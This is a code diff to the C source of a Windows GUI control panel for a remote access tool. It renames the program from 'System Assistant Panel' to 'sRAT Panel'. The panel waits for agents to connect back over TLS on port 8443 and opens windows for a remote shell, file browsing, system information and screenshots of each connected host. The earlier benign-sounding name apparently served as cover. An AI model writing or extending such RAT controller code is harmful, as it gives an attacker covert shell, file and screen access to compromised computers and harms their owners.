@@ -300,7 +300,7 @@ static HWND MakeChild(const char* cls, const char* title, int kind, Client* c, i
 static void OpenShell(Client* c) {
   if (FocusChild(c, K_SHELL)) return;
   char title[512]; sprintf(title, "Shell - %s", c->host);
-  HWND h = c->wnd[K_SHELL] = MakeChild("OAShell", title, K_SHELL, c, 720, 500); if (!h) return;
+  HWND h = c->wnd[K_SHELL] = MakeChild("SRatShell", title, K_SHELL, c, 720, 500); if (!h) return;
   CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
   CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_SHELLIN, g_inst, NULL); SetWindowSubclass(GetDlgItem(h, IDC_SHELLIN), ShellEditProc, 0, 0); CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, NULL);
   Fit(h); TlsSendMsg(&c->tls, C_SHELL_START, NULL, 0);
@@ -310,7 +310,7 @@ static void OpenFiles(Client* c) {
     SendMessage(GetDlgItem(c->wnd[K_FILES], IDC_FREFRESH), BM_CLICK, 0, 0); return;
   }
   char title[512]; sprintf(title, "Files - %s", c->host);
-  HWND h = c->wnd[K_FILES] = MakeChild("OAFiles", title, K_FILES, c, 760, 520); if (!h) return;
+  HWND h = c->wnd[K_FILES] = MakeChild("SRatFiles", title, K_FILES, c, 760, 520); if (!h) return;
   CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "C:\\", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_FPATH, g_inst, NULL);
   CreateWindowExA(0, "BUTTON", "Refresh", WS_CHILD | WS_VISIBLE, 0, 0, 84, 24, h, (HMENU)IDC_FREFRESH, g_inst, NULL);
   HWND lv = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL); SetWindowSubclass(lv, FilesListProc, 0, 0);
@@ -322,14 +322,14 @@ static void OpenFiles(Client* c) {
 }
 static void OpenInfo(Client* c) {
   if (!FocusChild(c, K_INFO)) {
-    char title[512]; sprintf(title, "SysInfo - %s", c->host); HWND h = c->wnd[K_INFO] = MakeChild("OAInfo", title, K_INFO, c, 620, 620); if (!h) return;
+    char title[512]; sprintf(title, "SysInfo - %s", c->host); HWND h = c->wnd[K_INFO] = MakeChild("SRatInfo", title, K_INFO, c, 620, 620); if (!h) return;
     CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "requesting...", WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | WS_HSCROLL | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL); Fit(h);
   }
   TlsSendMsg(&c->tls, C_SYSINFO, NULL, 0);
 }
 static void OpenShot(Client* c) {
   if (!FocusChild(c, K_SHOT)) {
-    char title[512]; sprintf(title, "Screen - %s", c->host); HWND h = c->wnd[K_SHOT] = MakeChild("OAShot", title, K_SHOT, c, 900, 560); if (!h) return;
+    char title[512]; sprintf(title, "Screen - %s", c->host); HWND h = c->wnd[K_SHOT] = MakeChild("SRatShot", title, K_SHOT, c, 900, 560); if (!h) return;
   }
   TlsSendMsg(&c->tls, C_SCREEN, NULL, 0);
 }
@@ -397,8 +397,8 @@ int WINAPI WinMain(HINSTANCE inst, HINSTANCE, LPSTR, int) {
   if (!LoadPfx("cert.pfx")) { MessageBoxA(NULL, "Failed to load cert.pfx", "Error", MB_ICONERROR); return 1; }
   WNDCLASSA wc = {0}; wc.lpfnWndProc = MainProc; wc.hInstance = inst;
   wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
-  wc.lpszClassName = "OpenAssistPanel"; wc.hIcon = LoadIcon(NULL, IDI_APPLICATION); RegisterClassA(&wc);
-  g_main = CreateWindowExA(0, "OpenAssistPanel", "System Assistant Panel", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 860, 480, NULL, NULL, inst, NULL);
+  wc.lpszClassName = "SRatPanel"; wc.hIcon = LoadIcon(NULL, IDI_APPLICATION); RegisterClassA(&wc);
+  g_main = CreateWindowExA(0, "SRatPanel", "sRAT Panel", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 860, 480, NULL, NULL, inst, NULL);
   if (!g_main) return 1;
   CreateWindowExA(0, "STATIC", "Agents connect to you.", WS_CHILD | WS_VISIBLE, 10, 8, 300, 18, g_main, NULL, inst, NULL);
   g_port = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "8443", WS_CHILD | WS_VISIBLE | ES_NUMBER, 0, 0, 60, 22, g_main, (HMENU)IDC_PORT, inst, NULL);
